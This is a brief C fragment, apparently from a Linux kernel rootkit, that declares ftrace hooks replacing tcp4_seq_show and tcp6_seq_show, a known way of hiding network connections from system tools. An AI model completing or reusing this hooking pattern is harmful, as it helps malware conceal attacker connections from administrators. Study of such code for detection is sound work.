static struct ftrace_hook hooks[] = {
	HOOK("tcp4_seq_show", bds_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("tcp6_seq_show", bds_tcp6_seq_show, &orig_tcp6_seq_show),
};
